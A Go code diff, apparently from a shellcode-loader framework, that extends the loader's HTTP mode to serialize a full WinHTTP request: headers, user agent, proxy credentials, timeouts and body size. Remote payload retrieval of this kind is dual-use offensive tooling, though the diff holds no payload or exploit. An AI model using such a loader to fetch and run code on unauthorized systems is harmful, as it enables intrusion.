@@ -2,15 +2,19 @@ package loader
 
 import (
 	"bytes"
+	"net/http"
 	"net/url"
 	"time"
+
+	"github.com/RSSU-Shellcode/GRT-Develop/serialization"
+	"github.com/RSSU-Shellcode/GRT-Develop/winhttp"
 )
 
-// +-----------+-----+
-// | mode flag | URL |
-// +-----------+-----+
-// |   byte    | var |
-// +-----------+-----+
+// +-----------+-----------------+
+// | mode flag | WinHTTP Request |
+// +-----------+-----------------+
+// |   byte    |       var       |
+// +-----------+-----------------+
 
 const modeHTTP = 3
 
@@ -22,34 +26,78 @@ type HTTP struct {
 
 // HTTPOptions contain HTTP mode options.
 type HTTPOptions struct {
-	ProxyURL string
-	Timeout  time.Duration
+	Headers   http.Header
+	UserAgent string
+	ProxyURL  string
+	ProxyUser string
+	ProxyPass string
+
+	ConnectTimeout time.Duration
+	SendTimeout    time.Duration
+	ReceiveTimeout time.Duration
+
+	MaxBodySize uint32
+	AccessType  uint8
 }
 
 // NewHTTP is used to create image config with HTTP mode.
 func NewHTTP(url string, opts *HTTPOptions) Image {
-	return &HTTP{
-		URL:  url,
-		Opts: opts,
+	if opts == nil {
+		opts = &HTTPOptions{}
 	}
+	return &HTTP{URL: url, Opts: opts}
 }
 
 // Encode implement Image interface.
-func (f *HTTP) Encode() ([]byte, error) {
-	req, err := url.ParseRequestURI(f.URL)
+func (h *HTTP) Encode() ([]byte, error) {
+	req, err := url.ParseRequestURI(h.URL)
 	if err != nil {
 		return nil, err
 	}
-	config := bytes.NewBuffer(make([]byte, 0, 64))
+	connectTimeout := uint32(h.Opts.ConnectTimeout.Milliseconds()) // #nosec G115
+	sendTimeout := uint32(h.Opts.SendTimeout.Milliseconds())       // #nosec G115
+	receiveTimeout := uint32(h.Opts.ReceiveTimeout.Milliseconds()) // #nosec G115
+	request := winhttp.Request{
+		URL:            req.String(),
+		UserAgent:      h.Opts.UserAgent,
+		ProxyUser:      h.Opts.ProxyUser,
+		ProxyPass:      h.Opts.ProxyPass,
+		ConnectTimeout: connectTimeout,
+		SendTimeout:    sendTimeout,
+		ReceiveTimeout: receiveTimeout,
+		MaxBodySize:    h.Opts.MaxBodySize,
+		AccessType:     h.Opts.AccessType,
+	}
+	if h.Opts.Headers != nil {
+		buf := bytes.Buffer{}
+		_ = h.Opts.Headers.Write(&buf)
+		request.Headers = buf.String()
+	}
+	if h.Opts.ProxyURL != "" {
+		req, err = url.ParseRequestURI(h.Opts.ProxyURL)
+		if err != nil {
+			return nil, err
+		}
+		URL := req.String()
+		// remove the last "/"
+		if URL[len(URL)-1] == '/' {
+			URL = URL[:len(URL)-1]
+		}
+		request.ProxyURL = URL
+	}
+	data, err := serialization.Marshal(&request)
+	if err != nil {
+		return nil, err
+	}
+	config := bytes.NewBuffer(make([]byte, 0, 512))
 	// write the mode
 	config.WriteByte(modeHTTP)
-	// write the URL
-	config.WriteString(stringToUTF16(req.String() + "\x00"))
-	// TODO write the options
+	// write the winhttp request
+	config.Write(data)
 	return config.Bytes(), nil
 }
 
 // Mode implement Image interface.
-func (f *HTTP) Mode() string {
+func (h *HTTP) Mode() string {
 	return ModeHTTP
 }
